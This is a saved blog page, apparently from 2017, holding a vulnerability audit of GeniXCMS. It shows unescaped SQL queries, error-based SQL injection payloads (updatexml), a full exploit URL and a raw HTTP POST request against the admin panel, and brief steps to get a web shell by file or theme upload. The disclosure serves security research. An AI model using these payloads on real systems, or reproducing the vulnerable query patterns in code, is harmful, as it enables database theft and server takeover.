@@ -1,0 +1,308 @@
+
+<!DOCTYPE html>
+
+<html lang="zh-cn">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>GeniXCMS审计之旅 - l3m0n - 博客园</title>
+<link href="./GeniXCMS审计之旅 - l3m0n - 博客园/blog-common.cssv=m_FXmwz3wxZoecUwNEK23PAzc-j9vbX_C6MblJ5ouMc1" rel="stylesheet" type="text/css"/>
+<link href="./GeniXCMS审计之旅 - l3m0n - 博客园/bundle-InsideDotNet.cssv=hm5Ncnf1UmSaS2roxKOjrIG9bKc-5gPzmHFjhD4ZWn01" id="MainCss" rel="stylesheet" type="text/css"/>
+<link href="./GeniXCMS审计之旅 - l3m0n - 博客园/bundle-InsideDotNet-mobile.cssv=riNccSBaYfFlRjQw4oW6Q_6u5zO0NRZr85vSvhPWcl01" id="mobile-style" media="only screen and (max-width: 768px)" rel="stylesheet" type="text/css"/>
+<link href="http://www.cnblogs.com/iamstudy/rss" rel="alternate" title="RSS" type="application/rss+xml"/>
+<link href="./GeniXCMS审计之旅 - l3m0n - 博客园/rsd.xml" rel="EditURI" title="RSD" type="application/rsd+xml"/>
+<link href="./GeniXCMS审计之旅 - l3m0n - 博客园/wlwmanifest.xml" rel="wlwmanifest" type="application/wlwmanifest+xml"/>
+<script src="./GeniXCMS审计之旅 - l3m0n - 博客园/jquery.js" type="text/javascript"></script>
+<script type="text/javascript">var currentBlogApp = 'iamstudy', cb_enable_mathjax=true;var isLogined=false;</script>
+<script src="./GeniXCMS审计之旅 - l3m0n - 博客园/blog-common.jsv=CPv0EEqm9L2aCgolHxaZfVYM6J-Sn5az_FJXbjzgr-o1" type="text/javascript"></script>
+</head>
+<body>
+<a name="top"></a>
+<!--done-->
+<div id="home">
+<div id="header">
+<div id="blogTitle">
+<div style="display:none"><img alt="谨以此模板祝贺【博客园开发者征途】系列图书《你必须知道的.net》出版发行" src="./GeniXCMS审计之旅 - l3m0n - 博客园/top.gif"/></div>
+<a href="http://www.cnblogs.com/iamstudy/" id="lnkBlogLogo"><img alt="返回主页" id="blogLogo" src="./GeniXCMS审计之旅 - l3m0n - 博客园/logo.gif"/></a>
+<!--done-->
+<h1><a class="headermaintitle" href="http://www.cnblogs.com/iamstudy/" id="Header1_HeaderTitle">l3m0n</a></h1>
+<h2></h2>
+</div><!--end: blogTitle 博客的标题和副标题 -->
+<div id="navigator">
+<ul id="navList">
+<li></li>
+<li><a class="menu" href="http://ing.cnblogs.com/" id="MyLinks1_SpaceLink">闪存</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/" id="blog_nav_myhome">首页</a></li>
+<li></li>
+<li></li>
+<li><a class="menu" href="https://i.cnblogs.com/" id="blog_nav_admin" rel="nofollow">管理</a></li>
+<li><a class="menu" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss">订阅</a>
+<a class="aHeaderXML" href="http://www.cnblogs.com/iamstudy/rss" id="blog_nav_rss_image"><img alt="订阅" src="./GeniXCMS审计之旅 - l3m0n - 博客园/xml.gif"/></a></li>
+</ul>
+<div class="clear"></div>
+<div class="blogStats">
+<div id="blog_stats">
+<!--done-->
+随笔- 1 
+文章- 65 
+评论- 17 
+</div>
+</div><!--end: blogStats -->
+</div><!--end: navigator 博客导航栏 -->
+</div><!--end: header 头部 -->
+<div id="main">
+<div id="mainContent">
+<div class="forFlow">
+<div id="post_detail">
+<!--done-->
+<div id="topics">
+<div class="post">
+<h1 class="postTitle">
+<a class="postTitle2" href="http://www.cnblogs.com/iamstudy/articles/6266268.html" id="cb_post_title_url">GeniXCMS审计之旅</a>
+</h1>
+<div class="clear"></div>
+<div class="postBody">
+<div class="cnblogs-markdown" id="cnblogs_post_body"><p>看到松阔拿到了cve，于是我也想去审计尝试一下，都是一些超级简单的洞。</p>
+<p>I found some unsafe method to cause a lot of problems.</p>
+<p>I hope this helps you.</p>
+<hr/>
+<h3 id="method-issue">method issue</h3>
+<p><a href="https://github.com/semplon/GeniXCMS/blob/master/inc/lib/Db.class.php">Db.class.php</a></p>
+<p>Can see this in Db.class.php, You can see that escape is safe.<br/>
+It is used in <strong>insert/update</strong> etc. But it is not used in <strong>select</strong>.</p>
+<pre><code>    public static function escape($vars)
+    {
+        if (DB_DRIVER == 'mysql') {
+            $vars = mysql_escape_string($vars);</code></pre>
+<p>This program will generally use <code>Typo::cleanX</code> to deal with <code>$_POST\$_GET</code></p>
+<p><a href="https://github.com/semplon/GeniXCMS/blob/master/inc/lib/Typo.class.php">Typo.class.php</a></p>
+<pre><code>    public static function cleanX($c)
+    {
+        $val = self::strip_tags_content($c, '&lt;script&gt;', true);
+        $val = htmlspecialchars(
+            $val,
+            ENT_QUOTES | ENT_HTML5,
+            'utf-8'
+        );
+        return $val;
+    }</code></pre>
+<p>It encodes the HTML character, But <code>\</code> is not processed. So I can use <code>\</code> to inject</p>
+<p><a href="http://php.net/manual/en/function.htmlspecialchars.php">function.htmlspecialchars</a></p>
+<h3 id="issue1">issue1</h3>
+<p><a href="https://github.com/semplon/GeniXCMS/blob/master/inc/lib/Tags.class.php">Tags.class.php</a></p>
+<pre><code>    public static function exist($tag)
+    {
+        $tag = Typo::cleanX($tag);
+        $sql = "SELECT `name` FROM `cat` WHERE `name` = '{$tag}' OR `slug` = '{$tag}' AND `type` = 'tag'";
+        $q = Db::result($sql);
+        // echo Db::$num_rows;
+        if (Db::$num_rows &gt; 0) {
+            return true;
+        } else {
+            return false;
+        }
+    }</code></pre>
+<p>if <code>$tag</code> = <code>and updatexml(1,(select version()),1)#\</code></p>
+<pre><code>SELECT `name` FROM `cat` WHERE `name` = 'and updatexml(1,(select version()),1)#\' OR `slug` = 'and updatexml(1,(select version()),1)#\' AND `type` = 'tag'</code></pre>
+<p>it look like this:</p>
+<pre><code>SELECT `name` FROM `cat` WHERE `name` = 'xx' and updatexml(1,(select version()),1);</code></pre>
+<h3 id="issue2">issue2</h3>
+<p><a href="https://github.com/semplon/GeniXCMS/blob/master/inc/lib/Db.class.php">Db.class.php</a></p>
+<pre><code>    public static function insert($vars)
+    {
+        if (is_array($vars)) {
+            $set = '';
+            $k = '';
+            foreach ($vars['key'] as $key =&gt; $val) {
+                $val = self::escape($val);
+                $set .= "'{$val}',";
+                $k .= "`{$key}`,";
+            }
+
+            $set = substr($set, 0, -1);
+            $k = substr($k, 0, -1);
+
+            $sql = sprintf('INSERT INTO `%s` (%s) VALUES (%s) ', $vars['table'], $k, $set);
+        } else {
+            $sql = $vars;
+        }
+        if (DB_DRIVER == 'mysql') {
+            mysql_query('SET CHARACTER SET utf8');
+            $q = mysql_query($sql) or die(mysql_error());
+            self::$last_id = mysql_insert_id();</code></pre>
+<p>here :</p>
+<pre><code>if (is_array($vars)) {
+} else {
+            $sql = $vars;
+}</code></pre>
+<p>when <code>$vars</code> not is an array. This will cause security problems. Because <code>$val = self::escape($val);</code> cann't to exec.</p>
+<p>Example:</p>
+<p><code>/inc/lib/Control/Backend/categories.control.php</code></p>
+<pre><code>if (User::access(1)) {
+    $data['sitetitle'] = CATEGORIES;
+    switch (isset($_POST['addcat'])) {
+        case true:
+            // cleanup first
+            $slug = Typo::slugify(Typo::cleanX($_POST['cat']));
+            $cat = Typo::cleanX($_POST['cat']);
+
+            if (!isset($_POST['token']) || !Token::isExist($_POST['token'])) {
+                // VALIDATE ALL
+                $alertDanger[] = TOKEN_NOT_EXIST;
+            }
+            if (!isset($_POST['cat']) || $_POST['cat'] == '') {
+                $alertDanger[] = CATEGORY_CANNOT_EMPTY;
+            }
+            if (isset($alertDanger)) {
+                $data['alertDanger'] = $alertDanger;
+            } else {
+                $cat = Db::insert(
+                    sprintf(
+                        "INSERT INTO `cat` VALUES (null, '%s', '%s', '%d', '', 'post' )",
+                        $cat,
+                        $slug,
+                        Typo::int($_POST['parent'])
+                    )
+                );
+                //print_r($cat);
+                $data['alertSuccess'][] = MSG_CATEGORY_ADDED.' '.$_POST['cat'];
+            }
+            if (isset($_POST['token'])) {
+                Token::remove($_POST['token']);
+            }
+            break;
+
+        default:
+            break;
+    }
+</code></pre>
+<p>here have safe issue:</p>
+<pre><code>                $cat = Db::insert(
+                    sprintf(
+                        "INSERT INTO `cat` VALUES (null, '%s', '%s', '%d', '', 'post' )",
+                        $cat,
+                        $slug,
+                        Typo::int($_POST['parent'])
+                    )
+                );</code></pre>
+<p>Of course, update also has this problem.</p>
+<h3 id="sql-injection">[sql injection]</h3>
+<ol>
+<li><p>issue1:</p>
+<p>/inc/lib/Control/Backend/posts.control.php</p>
+<pre><code>$data['post'] = Db::result("SELECT * FROM `posts` WHERE `id` = '{$_GET['id']}' ");</code></pre>
+<p>exp1:</p>
+<pre><code>http://lemon.love/code-src/GeniXCMS/GeniXCMS-master/gxadmin/index.php?page=posts&amp;act=edit&amp;id=6' and updatexml(1,(select user()),1)%23&amp;token=Pp52R3oD4wuLBVutgD9hMsMrp8alQD3bKmuf06AI0HZMzoMiRe3s18BUa4eIOqrMqj38Cp9aoQqWaw10</code></pre></li>
+<li><p>issue2:</p>
+<p>/inc/mod/newsletter/options.php</p>
+<pre><code>$usr = Db::result("SELECT * FROM `user` WHERE `group` = '{$_POST['recipient']}'");</code></pre>
+<p>exp2:</p>
+<pre><code>POST /code-src/GeniXCMS/GeniXCMS-master/gxadmin/index.php?page=mods&amp;mod=newsletter HTTP/1.1
+Host: lemon.love
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://lemon.love/code-src/GeniXCMS/GeniXCMS-master/gxadmin/index.php?page=mods&amp;mod=newsletter
+Cookie: GeniXCMS-I3YZLgqlM9CM33Zi6PBF=f0d4ea594sg6i85ovsgeeg4um1; USER_NAME_COOKIE=admin; SID_1=95aefa9c; GeniXCMS-I3YZLgqlM9CM33Zi6PBF=f0d4ea594sg6i85ovsgeeg4um1; GeniXCMS-Installation=bscpujchn91pl57oj10af4vb45; GeniXCMS-vMIHkJPDSgZrrg3uywYO=48a5t0i0d7bqh4q3toepkckf37
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 193
+
+subject=aaa%40qq.com&amp;recipient=a'+and+updatexml(1,(select+version()),1)%23&amp;type=text&amp;token=x972PTSsrW9U5tCdFGTuRpgsNewA0Ozm3UTaPsh9ixhA3R0O25cRE7FCK3xlyEttm4EUGJXfgb3cCs3H&amp;sendmail=&amp;message=aaa</code></pre></li>
+</ol>
+<h3 id="后台getshell">后台getshell</h3>
+<p>1、windows<br/>
+多媒体中上传<code>1.php.</code>，即可shell</p>
+<p>2、通用<br/>
+theme安装：上传zip文件<br/>
+\inc\themes\shell\1\1.php</p>
+</div><div id="MySignature"></div>
+<div class="clear"></div>
+<div id="blog_post_info_block">
+<div id="BlogPostCategory"></div>
+<div id="EntryTag"></div>
+<div id="blog_post_info">
+</div>
+<div class="clear"></div>
+<div id="post_next_prev"></div>
+</div>
+</div>
+<div class="postDesc">posted @ <span id="post-date">2017-01-09 18:48</span> <a href="http://www.cnblogs.com/iamstudy/">l3m0n</a> 阅读(<span id="post_view_count">...</span>) 评论(<span id="post_comment_count">...</span>)  <a href="https://i.cnblogs.com/EditArticles.aspx?postid=6266268" rel="nofollow">编辑</a> <a href="#" onclick="AddToWz(6266268);return false;">收藏</a></div>
+</div>
+<script src="./GeniXCMS审计之旅 - l3m0n - 博客园/highlight.min.jsid=20160127"></script><script>markdown_highlight();</script><script type="text/javascript">var allowComments=true,cb_blogId=242399,cb_entryId=6266268,cb_blogApp=currentBlogApp,cb_blogUserGuid='f80873d6-234e-e511-b908-9dcfd8948a71',cb_entryCreatedDate='2017/1/9 18:48:00';loadViewCount(cb_entryId);</script>
+</div><!--end: topics 文章、评论容器-->
+</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
+<div class="commentform" id="comment_form">
+<a name="commentform"></a>
+<div id="divCommentShow"></div>
+<div id="comment_nav"><span id="span_refresh_tips"></span><a clientidmode="Static" href="javascript:void(0);" id="lnk_RefreshComments" onclick="return RefreshCommentList();" runat="server">刷新评论</a><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a></div>
+<div id="comment_form_container"></div>
+<div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+<div id="ad_t2"></div>
+<div id="opt_under_post"></div>
+<div class="c_ad_block" id="cnblogs_c1"></div>
+<div id="under_post_news"></div>
+<div class="c_ad_block" id="cnblogs_c2"></div>
+<div id="under_post_kb"></div>
+<div class="c_ad_block" id="HistoryToday"></div>
+<script type="text/javascript">
+    fixPostBody();
+    setTimeout(function () { incrementViewCount(cb_entryId); }, 50);
+    deliverAdT2();
+    deliverAdC1();
+    deliverAdC2();    
+    loadNewsAndKb();
+    loadBlogSignature();
+    LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+    GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate);
+    loadOptUnderPost();
+    GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);   
+</script>
+</div>
+</div><!--end: forFlow -->
+</div><!--end: mainContent 主体内容容器-->
+<div id="sideBar">
+<div id="sideBarMain">
+<!--done-->
+<div class="newsItem">
+<h3 class="catListTitle">公告</h3>
+<div id="blog-news"></div><script type="text/javascript">loadBlogNews();</script>
+</div>
+<div id="calendar"><div id="blog-calendar" style="display:none"></div><script type="text/javascript">loadBlogDefaultCalendar();</script></div>
+<div id="leftcontentcontainer">
+<div id="blog-sidecolumn"></div><script type="text/javascript">loadBlogSideColumn();</script>
+</div>
+</div><!--end: sideBarMain -->
+</div><!--end: sideBar 侧边栏容器 -->
+<div class="clear"></div>
+<div class="clear"></div>
+</div><!--end: main -->
+<div class="clear"></div>
+<div id="footer">
+<!--done-->
+Copyright ©2017 l3m0n 谨以此模板祝贺【博客园开发者征途】系列图书之《你必须知道的.NET》出版发行
+	</div><!--end: footer -->
+</div><!--end: home 自定义的最大容器 -->
+<!--PageEndHtml Block Begin-->
+<div align="center" id="something">
+<script language="javascript" src="./GeniXCMS审计之旅 - l3m0n - 博客园/18599866.js" type="text/javascript"></script>
+<noscript><a href="//www.51.la/?18599866" target="_blank"><img alt="我要啦免费统计" src="./GeniXCMS审计之旅 - l3m0n - 博客园/18599866.asp" style="border:none"/></a></noscript>
+<script language="javascript" src="./GeniXCMS审计之旅 - l3m0n - 博客园/id=18599866&amp;mb=3" type="text/javascript"></script>
+</div>
+<script>
+$('#footer').html('Copyright &copy;2017 Syclover-l3m0n');
+console.log('Hello,welcome to my blog!!!\n                  --------l3m0n');
+window.onload=function(){
+  $('#q').css({'width':'100px'});
+  $('#under_post_news').html('');
+  $('#under_post_kb').html('');
+  $('#ad_t2').html('');
+  $('#cnblogs_c1').html('');
+  $('#cnblogs_c2').html('');
+}
+</script>
+<!--PageEndHtml Block End-->
+</body>
+</html>
